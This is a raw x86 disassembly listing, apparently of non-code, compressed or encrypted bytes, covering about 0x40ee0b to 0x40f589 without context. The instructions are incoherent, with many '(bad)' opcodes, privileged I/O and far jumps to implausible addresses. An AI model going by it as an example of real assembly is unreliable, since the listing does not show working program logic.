  40ee0b:	sbb    eax,0xf7babcdc
  40ee10:	push   DWORD PTR [ebx+ebx*8-0x33]
  40ee14:	adc    eax,DWORD PTR [ebp+0x43704aa4]
  40ee1a:	js     0x40ee83
  40ee1c:	xchg   esp,eax
  40ee1d:	rcl    ah,1
  40ee1f:	or     ecx,eax
  40ee21:	nop
  40ee22:	mov    edi,0xf85d6434
  40ee27:	bound  esi,QWORD PTR [eax-0x564008ae]
  40ee2d:	sub    BYTE PTR [edx-0x3f223bb3],bh
  40ee33:	pop    edi
  40ee34:	jno    0x40ee0d
  40ee36:	add    DWORD PTR [edx+0x17746536],ebx
  40ee3c:	lahf   
  40ee3d:	fcomp  DWORD PTR [edx+0x4024bd50]
  40ee43:	dec    edi
  40ee44:	cs jb  0x40ee65
  40ee47:	cmp    ch,ah
  40ee49:	jl     0x40ee95
  40ee4b:	lahf   
  40ee4c:	adc    BYTE PTR [eax+esi*4-0x19],al
  40ee50:	mov    dl,0x3c
  40ee52:	mov    WORD PTR [eax],?
  40ee54:	xchg   esp,eax
  40ee55:	ror    DWORD PTR [esi+ebx*1],1
  40ee58:	jbe    0x40eea1
  40ee5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee5b:	mov    BYTE PTR [edi],ah
  40ee5d:	add    DWORD PTR [eax],eax
  40ee5f:	and    BYTE PTR cs:[edi+0x15b248f1],ch
  40ee66:	mov    ds:0x9b56bc6d,al
  40ee6b:	jae    0x40edfe
  40ee6d:	fcomp  DWORD PTR [esi]
  40ee6f:	jmp    0x4bff8b31
  40ee74:	push   ebp
  40ee75:	mov    eax,0x4f2b7b6a
  40ee7a:	int3   
  40ee7b:	xor    eax,0x70de33d6
  40ee80:	dec    esi
  40ee81:	sub    ecx,edx
  40ee83:	push   0xd4a41c86
  40ee88:	das    
  40ee89:	xor    DWORD PTR [edx-0x20],ecx
  40ee8c:	(bad)  
  40ee8d:	js     0x40ee35
  40ee8f:	mov    edx,DWORD PTR [edx-0x29]
  40ee92:	shl    esi,1
  40ee94:	ins    DWORD PTR es:[edi],dx
  40ee95:	xchg   esp,eax
  40ee96:	test   eax,0x1f129ee5
  40ee9b:	inc    ecx
  40ee9c:	leave  
  40ee9d:	adc    al,0x7e
  40ee9f:	mov    eax,0x101c0671
  40eea4:	frstor [edx]
  40eea6:	jo     0x40ee9d
  40eea8:	add    edx,DWORD PTR [eax+0x3c7f5c61]
  40eeae:	ret    
  40eeaf:	shl    DWORD PTR [ebx-0x7b],0xa4
  40eeb3:	jae    0x40eebb
  40eeb5:	jne    0x40ef0e
  40eeb7:	stos   DWORD PTR es:[edi],eax
  40eeb8:	int3   
  40eeb9:	and    DWORD PTR [ebx+0x71],edi
  40eebc:	adc    ah,BYTE PTR ds:0x61d92516
  40eec2:	jmp    0xc0e6bed6
  40eec7:	leave  
  40eec8:	push   ebx
  40eec9:	sub    ebp,DWORD PTR [esp+ebp*8-0x3b]
  40eecd:	dec    esi
  40eece:	sbb    esp,DWORD PTR [edx-0x7b]
  40eed1:	int3   
  40eed2:	xor    al,0x2e
  40eed4:	jle    0x40ee9f
  40eed6:	xlat   BYTE PTR ds:[ebx]
  40eed7:	mov    BYTE PTR [ecx],0xb8
  40eeda:	fimul  DWORD PTR [eax]
  40eedc:	mul    DWORD PTR [edx]
  40eede:	xchg   ebp,eax
  40eedf:	add    al,0x65
  40eee1:	add    BYTE PTR [ecx+0x3afc5ddd],bh
  40eee7:	and    eax,0x45f2565
  40eeec:	test   eax,0x12e2e6ae
  40eef1:	ins    BYTE PTR es:[edi],dx
  40eef2:	and    cl,BYTE PTR [edi+0x72]
  40eef5:	sub    BYTE PTR [esi+eiz*4+0x12],0x23
  40eefa:	in     al,dx
  40eefb:	(bad)  
  40eefc:	adc    ebx,DWORD PTR [eax+0x45]
  40eeff:	int    0x70
  40ef01:	cmp    eax,0xb5910729
  40ef06:	std    
  40ef07:	and    eax,0xb645c47a
  40ef0c:	addr16 pop edx
  40ef0e:	retf   
  40ef0f:	jl     0x40ef70
  40ef11:	jle    0x40ef00
  40ef13:	push   0xffffffd5
  40ef15:	pavgb  mm6,QWORD PTR [ebx]
  40ef18:	aas    
  40ef19:	mov    eax,ds:0xf350bf31
  40ef1e:	lods   al,BYTE PTR ds:[esi]
  40ef1f:	pop    edi
  40ef20:	push   esp
  40ef21:	rcl    edx,1
  40ef23:	adc    bh,BYTE PTR es:[edx+0x2ecd5e8a]
  40ef2a:	inc    ebp
  40ef2b:	scas   eax,DWORD PTR es:[edi]
  40ef2c:	or     eax,ebx
  40ef2e:	inc    edi
  40ef2f:	sbb    BYTE PTR [edx*1+0x275a0930],0x2a
  40ef37:	shr    BYTE PTR [esi-0x6df99453],1
  40ef3d:	cdq    
  40ef3e:	data16 rol BYTE PTR [edi],0x69
  40ef42:	push   edi
  40ef43:	call   0x65c1a424
  40ef48:	int    0x6d
  40ef4a:	lock test eax,0x813dd3f
  40ef50:	or     BYTE PTR [ebp+0x36],cl
  40ef53:	(bad)  [ebx+0xa]
  40ef56:	test   ecx,ecx
  40ef58:	mov    BYTE PTR ds:0x7139b8cb,dl
  40ef5e:	xor    bh,BYTE PTR [edx+0x4b]
  40ef61:	xor    al,0x70
  40ef63:	sub    dh,0x71
  40ef66:	rol    BYTE PTR [esi+0x777aa963],cl
  40ef6c:	hlt    
  40ef6d:	cwde   
  40ef6e:	fwait
  40ef6f:	sahf   
  40ef70:	jnp    0x40ef26
  40ef72:	retf   
  40ef73:	mov    dh,0x49
  40ef75:	idiv   DWORD PTR [edx+0x5b46c737]
  40ef7b:	mov    dh,0x4a
  40ef7d:	sub    eax,0x8dfe2b84
  40ef82:	(bad)  
  40ef83:	call   0x1b492563
  40ef88:	(bad)  
  40ef89:	mov    ss:0x3ff253bd,al
  40ef8f:	in     al,0xb4
  40ef91:	mov    BYTE PTR [edi-0xe4e6f25],al
  40ef97:	mov    edi,0xb943f8a7
  40ef9c:	aad    0xe4
  40ef9e:	pop    ds
  40ef9f:	arpl   si,cx
  40efa1:	mov    ds,WORD PTR [edi]
  40efa3:	inc    esi
  40efa4:	stos   DWORD PTR es:[edi],eax
  40efa5:	mov    eax,ds:0x375aa66
  40efaa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40efab:	push   0x7a2ccada
  40efb0:	xchg   BYTE PTR [esi],ah
  40efb2:	les    ecx,FWORD PTR [ecx+0x50]
  40efb5:	shl    BYTE PTR [edx+0x0],1
  40efb8:	in     al,0xe2
  40efba:	xchg   edi,eax
  40efbb:	adc    ebx,edx
  40efbd:	mov    edi,0x194493ff
  40efc2:	sbb    bl,bh
  40efc4:	ret    
  40efc5:	rcr    BYTE PTR [ecx+esi*8-0x37b2ed83],cl
  40efcc:	mov    eax,0x79b61117
  40efd1:	cmp    BYTE PTR [edx+esi*8+0x60],cl
  40efd5:	popa   
  40efd6:	fwait
  40efd7:	xchg   BYTE PTR ds:0x6564a8eb,dh
  40efdd:	iret   
  40efde:	aad    0x67
  40efe0:	je     0x40f015
  40efe2:	out    0xa6,eax
  40efe4:	dec    ebx
  40efe5:	daa    
  40efe6:	(bad)  
  40efe7:	rol    DWORD PTR ds:0x497b4e4,1
  40efed:	xchg   edx,eax
  40efee:	sub    esp,DWORD PTR [edi-0x402587ba]
  40eff4:	fadd   st(7),st
  40eff6:	out    dx,eax
  40eff7:	sbb    eax,0xc7d45ee
  40effc:	push   ebx
  40effd:	mov    ebp,0x67e2b27b
  40f002:	cmp    DWORD PTR [eax+edx*4+0xc],ebx
  40f006:	rol    BYTE PTR [edx],0x4e
  40f009:	stos   BYTE PTR es:[edi],al
  40f00a:	dec    edx
  40f00b:	adc    edi,esp
  40f00d:	and    eax,0x25c2f25d
  40f012:	repnz push ebp
  40f014:	out    0x25,eax
  40f016:	xor    cl,dh
  40f018:	loope  0x40f054
  40f01a:	sbb    eax,0x44961115
  40f01f:	inc    ecx
  40f020:	out    dx,eax
  40f021:	pop    es
  40f022:	daa    
  40f023:	repnz xor al,0x5b
  40f026:	mov    WORD PTR [edx+0x19],ss
  40f029:	ss dec esp
  40f02b:	in     al,dx
  40f02c:	daa    
  40f02d:	mov    ecx,0xa3925031
  40f032:	mov    dh,0xf7
  40f034:	loop   0x40f050
  40f036:	in     eax,dx
  40f037:	jmp    0xfdd1e645
  40f03c:	in     eax,dx
  40f03d:	outs   dx,BYTE PTR ds:[esi]
  40f03e:	lahf   
  40f03f:	mov    ah,0x14
  40f041:	out    0x17,eax
  40f043:	xchg   edi,eax
  40f044:	out    dx,eax
  40f045:	inc    esi
  40f046:	jle    0x40efcd
  40f048:	jbe    0x40f025
  40f04a:	icebp  
  40f04b:	imul   eax,eax,0x83513a1
  40f051:	(bad)  
  40f052:	jecxz  0x40f00f
  40f054:	or     al,BYTE PTR [edx-0x1c1b3360]
  40f05a:	cld    
  40f05b:	push   ds
  40f05c:	cdq    
  40f05d:	in     al,dx
  40f05e:	push   0xffffffb7
  40f060:	dec    ecx
  40f061:	(bad)  
  40f062:	push   0xffffffc6
  40f064:	inc    esp
  40f065:	popf   
  40f066:	xchg   esi,eax
  40f067:	out    dx,eax
  40f068:	scas   al,BYTE PTR es:[edi]
  40f069:	in     al,0x72
  40f06b:	lods   al,BYTE PTR ds:[esi]
  40f06c:	bnd jo 0x40f093
  40f06f:	shr    ebx,1
  40f071:	cli    
  40f072:	cmp    eax,0x7e8e74e5
  40f077:	mov    cl,0x70
  40f079:	pop    ss
  40f07a:	lock (bad) 
  40f07c:	into   
  40f07d:	div    BYTE PTR [edi+ebx*2]
  40f080:	dec    eax
  40f081:	push   edx
  40f082:	xor    ebx,ebp
  40f084:	into   
  40f085:	retf   
  40f086:	jmp    0xe7e8:0xc769680a
  40f08d:	jp     0x40f03d
  40f08f:	ret    
  40f090:	sbb    eax,0xb60ddf1c
  40f095:	sub    eax,0x6728e9ad
  40f09a:	arpl   di,di
  40f09c:	cmp    BYTE PTR [edx-0x1b],bl
  40f09f:	sub    eax,0xff3b5e82
  40f0a4:	mov    dl,0x6c
  40f0a6:	sbb    BYTE PTR [ebx-0x5d],dl
  40f0a9:	imul   esi,DWORD PTR [eax-0x3bde38e7],0xfffffffd
  40f0b0:	aam    0x5b
  40f0b2:	(bad)  
  40f0b3:	adc    bh,BYTE PTR ds:0xf68b4a2f
  40f0b9:	arpl   WORD PTR [edx+0x315b4cae],cx
  40f0bf:	xchg   edi,eax
  40f0c0:	test   DWORD PTR es:[ebx-0x4],esp
  40f0c4:	jae    0x40f0c8
  40f0c6:	dec    edx
  40f0c7:	push   edx
  40f0c8:	cmp    al,0xb4
  40f0ca:	and    eax,0x9c35766d
  40f0cf:	jae    0x40f0fe
  40f0d1:	push   dx
  40f0d3:	aas    
  40f0d4:	sbb    ch,BYTE PTR [ebx-0xc]
  40f0d7:	or     eax,0xd7f206e3
  40f0dc:	adc    edi,DWORD PTR [eax+0x17959be3]
  40f0e2:	repnz mov dh,0x9d
  40f0e5:	out    dx,eax
  40f0e6:	mov    bl,0x19
  40f0e8:	ret    0x92ac
  40f0eb:	sbb    al,0x4f
  40f0ed:	jo     0x40f139
  40f0ef:	and    dl,BYTE PTR [esi]
  40f0f1:	aam    0x5a
  40f0f3:	pop    eax
  40f0f4:	mov    esp,0xb596676f
  40f0f9:	fidivr WORD PTR [eax-0x34]
  40f0fc:	retf   
  40f0fd:	dec    edi
  40f0fe:	mov    WORD PTR [eax],gs
  40f100:	test   al,0x2c
  40f102:	retf   0x42c4
  40f105:	dec    esi
  40f106:	mov    edi,0xe6ba13d1
  40f10b:	imul   ebx,DWORD PTR ds:0x9c7cf51e,0xffffff80
  40f112:	mov    ebp,0x2f2466d
  40f117:	repz ret 0xb679
  40f11b:	push   ebp
  40f11c:	mov    esi,0xc478e414
  40f121:	in     eax,0x75
  40f123:	mov    dl,0xe4
  40f125:	sub    ebx,ecx
  40f127:	mov    ch,0xcf
  40f129:	shl    BYTE PTR [ebp-0x7b745aba],0x59
  40f130:	out    0xb7,eax
  40f132:	pop    ebp
  40f133:	or     eax,0x6a66f87
  40f138:	pop    ebp
  40f139:	cmp    ah,BYTE PTR [eax]
  40f13b:	cli    
  40f13c:	cmp    BYTE PTR [edx+ebp*8-0x23],bh
  40f140:	aam    0x32
  40f142:	xor    bh,BYTE PTR [ecx+0x380613d8]
  40f148:	push   edx
  40f149:	mov    dh,0xbf
  40f14b:	xor    DWORD PTR [ecx-0x309521e7],0x4320be03
  40f155:	jp     0x40f186
  40f157:	sbb    ch,BYTE PTR [edi-0x21]
  40f15a:	arpl   si,cx
  40f15c:	retf   0xf624
  40f15f:	lods   eax,DWORD PTR ds:[esi]
  40f160:	pop    es
  40f161:	stc    
  40f162:	loop   0x40f195
  40f164:	(bad)  
  40f165:	dec    ecx
  40f166:	jp     0x40f147
  40f168:	add    DWORD PTR [esi+0x1417aefd],ecx
  40f16e:	xor    ebx,DWORD PTR [ebx-0x597614e]
  40f174:	(bad)  
  40f175:	mov    edx,0xc7cd941a
  40f17a:	hlt    
  40f17b:	imul   edx,DWORD PTR [ecx-0x3d],0xc35cee98
  40f182:	xchg   DWORD PTR [edi+0x3ffc8c95],eax
  40f188:	mov    dh,0xd7
  40f18a:	push   ds
  40f18b:	cmp    BYTE PTR [eax-0x70ad5f61],0x56
  40f192:	cdq    
  40f193:	dec    ebx
  40f194:	gs jne 0x40f1a3
  40f197:	(bad)  
  40f198:	mov    DWORD PTR [ebx],ebp
  40f19a:	push   0x7c
  40f19c:	retf   0x160a
  40f19f:	inc    esp
  40f1a0:	mov    cl,0x80
  40f1a2:	test   DWORD PTR [ecx+ebp*4-0x77],ecx
  40f1a6:	lahf   
  40f1a7:	and    al,0xf7
  40f1a9:	push   edi
  40f1aa:	and    al,0x59
  40f1ac:	inc    esp
  40f1ad:	dec    ebx
  40f1af:	(bad)  
  40f1b0:	sbb    eax,0xb0116b92
  40f1b5:	js     0x40f202
  40f1b7:	or     BYTE PTR [eax],al
  40f1b9:	mov    eax,ds:0x56fab706
  40f1be:	cmc    
  40f1bf:	je     0x40f143
  40f1c1:	(bad)  
  40f1c2:	pop    ebp
  40f1c3:	idiv   dl
  40f1c5:	nop
  40f1c6:	inc    ebp
  40f1c7:	cmp    al,0x5c
  40f1c9:	repz (bad) 
  40f1cb:	out    dx,al
  40f1cc:	adc    cl,ah
  40f1ce:	fldenv ss:[edi]
  40f1d1:	jle    0x40f1bf
  40f1d3:	shl    BYTE PTR es:[edi+0x7f991f43],cl
  40f1da:	rcr    al,1
  40f1dc:	test   al,0x28
  40f1de:	add    DWORD PTR [ebp+0x305bc07e],ecx
  40f1e4:	daa    
  40f1e5:	xchg   bl,al
  40f1e7:	adc    DWORD PTR [ebp-0x6a],ebx
  40f1ea:	cs xchg esi,eax
  40f1ec:	stc    
  40f1ed:	js     0x40f1ef
  40f1ef:	add    eax,0x1
  40f1f2:	inc    ecx
  40f1f3:	fwait
  40f1f4:	jns    0x40f238
  40f1f6:	imul   ebx,esi,0xffffffc4
  40f1f9:	sti    
  40f1fa:	std    
  40f1fb:	push   esi
  40f1fc:	jmp    0x65886d33
  40f201:	jne    0x40f21c
  40f203:	pusha  
  40f204:	cmp    al,0x79
  40f206:	jle    0x40f23f
  40f208:	jno    0x40f20b
  40f20a:	inc    eax
  40f20b:	not    DWORD PTR [eax]
  40f20d:	jnp    0x40f1c7
  40f20f:	adc    BYTE PTR [edx+ebp*2],dh
  40f212:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f213:	or     BYTE PTR [ecx+0x4cc656ec],0xec
  40f21a:	push   esi
  40f21b:	cmp    DWORD PTR [eax+0x47],eax
  40f21e:	pop    ds
  40f21f:	data16 scas al,BYTE PTR es:[edi]
  40f221:	sbb    ebx,DWORD PTR ds:0xad79f5e4
  40f227:	dec    esi
  40f228:	add    ecx,DWORD PTR ss:[esi]
  40f22b:	jle    0x40f1c7
  40f22d:	jns    0x40f286
  40f22f:	rol    DWORD PTR [esi+0x0],1
  40f232:	push   eax
  40f233:	daa    
  40f234:	xchg   esp,eax
  40f235:	cwde   
  40f236:	push   ecx
  40f237:	pop    ebx
  40f238:	(bad)
  40f23b:	(bad)  
  40f23c:	push   ss
  40f23d:	arpl   WORD PTR [eax-0x44],bp
  40f240:	pushf  
  40f241:	cdq    
  40f242:	jmp    0x77d4:0xb7c1b0d1
  40f249:	pushf  
  40f24a:	out    dx,eax
  40f24b:	jns    0x40f21e
  40f24d:	jmp    0xf16a89c
  40f252:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f253:	jbe    0x40f24d
  40f255:	int3   
  40f256:	xor    al,0x8f
  40f258:	repnz cmp ecx,edx
  40f25b:	enter  0xd374,0x9
  40f25f:	fwait
  40f260:	add    eax,0xa04cfca4
  40f265:	rcr    al,cl
  40f267:	retf   0x4c64
  40f26a:	push   ebp
  40f26b:	aaa    
  40f26c:	ss nop
  40f26e:	pop    edx
  40f26f:	out    dx,al
  40f270:	pop    ss
  40f271:	loope  0x40f232
  40f273:	xchg   edx,eax
  40f274:	mov    cs,edi
  40f276:	test   BYTE PTR [esi+0x69172287],0xe4
  40f27d:	mov    DWORD PTR [ecx+0x71],ecx
  40f280:	fwait
  40f281:	stc    
  40f282:	pop    ecx
  40f283:	jmp    0xaf96e749
  40f288:	das    
  40f289:	jb     0x40f2b3
  40f28b:	out    0xb5,eax
  40f28d:	test   eax,0xed0bce56
  40f292:	ret    0xa4e4
  40f295:	loop   0x40f247
  40f297:	xchg   ebx,eax
  40f298:	mov    ch,0xca
  40f29a:	lahf   
  40f29b:	ins    DWORD PTR es:[edi],dx
  40f29c:	test   al,0x8a
  40f29e:	push   ss
  40f29f:	js     0x40f2bd
  40f2a1:	mov    ebp,0x4471a592
  40f2a6:	pop    esi
  40f2a7:	sbb    al,BYTE PTR [esi+0xc]
  40f2aa:	mov    edx,0xe339b6f3
  40f2af:	cmp    BYTE PTR [ebx],bh
  40f2b1:	sbb    BYTE PTR [ebx+ecx*2],0x4f
  40f2b5:	fadd   DWORD PTR [eax+0x37]
  40f2b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f2b9:	enter  0xeda3,0x3e
  40f2bd:	adc    DWORD PTR [ebx-0x3c9a8158],ecx
  40f2c3:	xchg   ebp,eax
  40f2c4:	mov    edx,0x27a1e42c
  40f2c9:	sub    esp,DWORD PTR [esp+ebp*1-0x12]
  40f2cd:	test   BYTE PTR [edi+0x365b641d],ah
  40f2d3:	adc    eax,0xba57db86
  40f2d8:	jle    0x40f311
  40f2da:	mov    esi,0x30834fb0
  40f2df:	ds pop ebp
  40f2e1:	xchg   ecx,eax
  40f2e2:	pushf  
  40f2e3:	iret   
  40f2e4:	and    esp,edi
  40f2e6:	or     cl,BYTE PTR [ecx+0x192d0038]
  40f2ec:	adc    ebx,DWORD PTR [ebp*4-0x1beb9a5d]
  40f2f3:	scas   al,BYTE PTR es:[edi]
  40f2f4:	push   ss
  40f2f5:	pop    eax
  40f2f6:	mov    eax,ds:0xec1d4d99
  40f2fb:	scas   eax,DWORD PTR es:[edi]
  40f2fc:	pop    ds
  40f2fd:	push   ebx
  40f2fe:	mov    esp,0x1335b438
  40f303:	mov    ds:0xc056de63,eax
  40f308:	push   ebp
  40f309:	mov    ds:0x887baf37,al
  40f30e:	jo     0x40f34f
  40f310:	mov    ch,0x1
  40f312:	inc    DWORD PTR [ecx-0x5c5e9171]
  40f318:	mov    bl,0x57
  40f31a:	(bad)  
  40f31b:	push   edx
  40f31c:	daa    
  40f31d:	inc    edx
  40f31e:	popa   
  40f31f:	xor    eax,0xe2e1e0a9
  40f324:	ds loope 0x40f321
  40f327:	inc    esi
  40f328:	in     al,0x59
  40f32a:	shl    BYTE PTR [eax+0x64],cl
  40f32d:	jmp    0xeebf:0x58b2c538
  40f334:	mov    esp,0x3e85e291
  40f339:	mov    ecx,0xde1f958c
  40f33e:	xchg   edi,eax
  40f33f:	sbb    DWORD PTR [ebp-0x77],ebx
  40f342:	(bad)  
  40f343:	mov    al,0x9d
  40f345:	sbb    bh,dl
  40f347:	inc    ebp
  40f348:	inc    eax
  40f349:	xchg   edx,eax
  40f34a:	pop    ds
  40f34b:	pop    edi
  40f34c:	mov    al,0x8
  40f34e:	jns    0x40f325
  40f350:	adc    BYTE PTR [ebp-0x7e592b44],al
  40f356:	inc    esp
  40f357:	js     0x40f375
  40f359:	and    eax,0xae37d0e3
  40f35e:	cmp    BYTE PTR [edx+0x4f],0x0
  40f362:	imul   esi,DWORD PTR [ebx],0xfffffffa
  40f365:	mov    dl,0x6c
  40f367:	stos   DWORD PTR es:[edi],eax
  40f368:	dec    ecx
  40f369:	dec    ebp
  40f36a:	or     DWORD PTR [ecx-0x16],ecx
  40f36d:	push   ecx
  40f36e:	push   esi
  40f36f:	lahf   
  40f370:	pop    es
  40f371:	imul   esp,ebp,0x4b91de32
  40f377:	enter  0xbfc1,0x48
  40f37b:	and    dh,BYTE PTR [ecx+0xb967695]
  40f381:	cmovno ebp,DWORD PTR ds:[ebp-0x40e678c1]
  40f389:	lods   eax,DWORD PTR ds:[esi]
  40f38a:	out    0xdd,al
  40f38c:	ret    
  40f38d:	mov    dl,BYTE PTR [ebx-0xb770f98]
  40f393:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f394:	and    ah,BYTE PTR [eax+0x6b3fe1a8]
  40f39a:	push   cs
  40f39b:	pop    es
  40f39c:	mov    ebx,0xd83f3282
  40f3a1:	or     BYTE PTR [eax],dh
  40f3a3:	int3   
  40f3a4:	fnstcw WORD PTR [ecx-0x65f2b2bb]
  40f3aa:	xchg   ecx,eax
  40f3ab:	sbb    ah,bl
  40f3ad:	push   ds
  40f3ae:	pop    ds
  40f3af:	icebp  
  40f3b0:	pop    es
  40f3b1:	xor    eax,0x1a6db2be
  40f3b6:	repz test bh,bh
  40f3b9:	mov    ah,0x2e
  40f3bb:	sbb    edi,DWORD PTR [ecx+0x4]
  40f3be:	pusha  
  40f3bf:	test   dh,ch
  40f3c1:	cmc    
  40f3c2:	jmp    FWORD PTR [ecx+0x21]
  40f3c5:	and    eax,0xd993e3b7
  40f3ca:	dec    eax
  40f3cb:	sub    al,0xdd
  40f3cd:	or     DWORD PTR [edx-0x2df21dc3],edi
  40f3d3:	mov    dl,0xc5
  40f3d5:	xor    al,0x9b
  40f3d7:	fnstcw WORD PTR [ebx+0x7c06534d]
  40f3dd:	cmp    al,0x21
  40f3df:	push   edx
  40f3e0:	shl    BYTE PTR [eax],0x6f
  40f3e3:	inc    edi
  40f3e4:	data16 jmp 0x40f404
  40f3e7:	sub    BYTE PTR [esi+ebp*1],ah
  40f3ea:	loop   0x40f379
  40f3ec:	or     eax,0x39951a2
  40f3f1:	aam    0xc4
  40f3f3:	xchg   BYTE PTR [esi],dl
  40f3f5:	inc    ebp
  40f3f6:	jl     0x40f434
  40f3f8:	inc    ebp
  40f3f9:	mov    ecx,0xc53f5cf
  40f3fe:	mov    ecx,0xd253c23
  40f403:	(bad)  
  40f404:	dec    eax
  40f405:	pop    ebx
  40f406:	test   BYTE PTR [eax-0x65],bh
  40f409:	push   ds
  40f40a:	push   esp
  40f40b:	(bad)  
  40f40c:	ror    BYTE PTR [eax],1
  40f40e:	xlat   BYTE PTR ds:[ebx]
  40f40f:	mov    esi,0x609e481a
  40f414:	jae    0x40f3f7
  40f416:	gs (bad) 
  40f418:	mov    al,ds:0xd5b6ca8e
  40f41d:	in     eax,dx
  40f41e:	aad    0x18
  40f420:	push   ss
  40f421:	sbb    al,0xb3
  40f423:	mov    cl,0x4b
  40f425:	push   0xffffffde
  40f427:	mov    edi,0xfb84014f
  40f42c:	sub    DWORD PTR [esi*8+0x6b46ab28],0xe2b44cd8
  40f437:	dec    esi
  40f438:	cdq    
  40f439:	xor    ch,BYTE PTR [ecx+eiz*4+0x1b]
  40f43d:	xor    BYTE PTR [ebx+0x37],dl
  40f440:	push   0xffffffb7
  40f442:	and    bh,BYTE PTR [eax-0x11]
  40f445:	mov    ch,0x72
  40f447:	aas    
  40f448:	sub    dh,BYTE PTR [ecx-0x2ab566e6]
  40f44e:	lods   al,BYTE PTR ds:[esi]
  40f44f:	loopne 0x40f3e0
  40f451:	xchg   BYTE PTR [esi],bl
  40f453:	xor    BYTE PTR [ecx+0x5d],al
  40f456:	loop   0x40f415
  40f458:	jbe    0x40f45a
  40f45a:	inc    eax
  40f45b:	pop    ss
  40f45c:	add    BYTE PTR ds:0x5ce5e70b,0x1
  40f463:	dec    edx
  40f464:	outs   dx,DWORD PTR ds:[esi]
  40f465:	mov    dh,0x55
  40f467:	xor    al,0x34
  40f469:	sub    eax,0x16d072f
  40f46e:	stos   DWORD PTR es:[edi],eax
  40f46f:	retf   
  40f470:	pop    edx
  40f471:	push   es
  40f472:	rcl    DWORD PTR [edx-0x6a],cl
  40f475:	xchg   ebp,eax
  40f476:	fnstcw WORD PTR [ebx+0x75]
  40f479:	dec    eax
  40f47a:	(bad)  
  40f47b:	jmp    0x40f438
  40f47d:	cmp    BYTE PTR [ecx-0x36],bl
  40f480:	arpl   WORD PTR [edx],si
  40f482:	pop    ds
  40f483:	clc    
  40f484:	mov    al,0x52
  40f486:	adc    DWORD PTR [ebx],ebp
  40f488:	jbe    0x40f4fa
  40f48a:	mov    ch,0x92
  40f48c:	lahf   
  40f48d:	mov    ds:0x43df4261,al
  40f492:	icebp  
  40f493:	hlt    
  40f494:	jne    0x40f47c
  40f496:	cdq    
  40f497:	mov    al,0x37
  40f499:	js     0x40f4d7
  40f49b:	inc    esi
  40f49c:	aad    0x3b
  40f49e:	push   eax
  40f49f:	mov    eax,ds:0x3e88ae1a
  40f4a4:	(bad)  
  40f4a5:	lods   al,BYTE PTR ds:[esi]
  40f4a6:	jle    0x40f482
  40f4a8:	or     BYTE PTR [esi],dh
  40f4aa:	test   eax,0x9956a633
  40f4af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f4b0:	test   eax,0x3a92ac8a
  40f4b5:	and    DWORD PTR [edi-0x18f440e5],0x78
  40f4bc:	fucomp st(5)
  40f4be:	hlt    
  40f4bf:	loopne 0x40f48c
  40f4c1:	daa    
  40f4c2:	and    BYTE PTR [ebp+0x1abfe250],0x5c
  40f4c9:	inc    ebx
  40f4ca:	cmc    
  40f4cb:	out    0xa7,eax
  40f4cd:	dec    esp
  40f4ce:	mov    edi,edx
  40f4d0:	xor    ch,bh
  40f4d2:	push   ebp
  40f4d3:	and    bl,BYTE PTR [ebx+eiz*4]
  40f4d6:	xchg   esp,eax
  40f4d7:	(bad)  
  40f4d8:	stos   DWORD PTR es:[edi],eax
  40f4d9:	mov    eax,0xe7db5c93
  40f4de:	call   DWORD PTR [edx+0x608d428d]
  40f4e4:	dec    esi
  40f4e5:	sbb    BYTE PTR [eiz*8-0x2ddb321d],dl
  40f4ec:	or     ecx,DWORD PTR [esi+0x7cb63765]
  40f4f2:	pop    ebp
  40f4f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f4f4:	pop    esp
  40f4f5:	dec    edi
  40f4f6:	scas   eax,DWORD PTR es:[edi]
  40f4f7:	repnz das 
  40f4f9:	enter  0xdf6a,0x9b
  40f4fd:	push   cs
  40f4fe:	unpcklps xmm0,XMMWORD PTR [ebx-0x37]
  40f502:	and    DWORD PTR [ebp-0x4dc0e1a5],0x859b0f04
  40f50c:	mov    DWORD PTR [ebx+0x50],esp
  40f50f:	jae    0x40f552
  40f511:	shl    BYTE PTR [ebp-0x37eed552],1
  40f517:	je     0x40f554
  40f519:	fisttp WORD PTR [esi-0x5e]
  40f51c:	push   ecx
  40f51d:	in     al,dx
  40f51e:	xchg   esi,eax
  40f51f:	iret   
  40f520:	xchg   ecx,eax
  40f521:	gs push esp
  40f523:	push   ds
  40f524:	js     0x40f553
  40f526:	cmp    al,0x2b
  40f528:	jno    0x40f520
  40f52a:	xchg   esp,eax
  40f52b:	jbe    0x40f4bc
  40f52d:	(bad)  
  40f52e:	sbb    al,BYTE PTR [ecx-0x5a]
  40f531:	cmp    al,0xa5
  40f533:	inc    esi
  40f534:	popf   
  40f535:	mov    ebp,0xb8ffb5c8
  40f53a:	sbb    edx,DWORD PTR [edx]
  40f53c:	push   eax
  40f53d:	bound  edi,QWORD PTR [ecx+ebp*8]
  40f540:	mov    dl,ch
  40f542:	add    BYTE PTR [eax],bh
  40f544:	mov    esi,0x2063cc49
  40f549:	nop
  40f54a:	std    
  40f54b:	push   cs
  40f54c:	mov    dl,dh
  40f54e:	xchg   ebx,eax
  40f54f:	adc    al,bh
  40f551:	scas   al,BYTE PTR es:[edi]
  40f552:	mov    dh,0x6a
  40f554:	int    0xf5
  40f556:	jo     0x40f5a2
  40f558:	icebp  
  40f559:	xchg   edx,eax
  40f55b:	sbb    BYTE PTR ds:0x1c40f802,0x52
  40f562:	inc    esp
  40f563:	mov    ds:0x905f81c5,al
  40f568:	scas   eax,DWORD PTR es:[edi]
  40f569:	lods   eax,DWORD PTR ds:[esi]
  40f56a:	xlat   BYTE PTR fs:[ebx]
  40f56c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f56d:	cmp    BYTE PTR [ecx],0xf3
  40f570:	test   DWORD PTR [ecx],esp
  40f572:	pop    ds
  40f573:	dec    esp
  40f574:	fistp  DWORD PTR [edi]
  40f576:	jns    0x40f561
  40f578:	add    DWORD PTR [eax+0x11],ebp
  40f57b:	pop    ecx
  40f57c:	and    edi,ebp
  40f57e:	pop    ecx
  40f57f:	inc    eax
  40f580:	dec    esi
  40f581:	push   es
  40f582:	push   esp
  40f583:	and    ch,BYTE PTR [ecx+0x62303401]
  40f589:	and    al,0xef
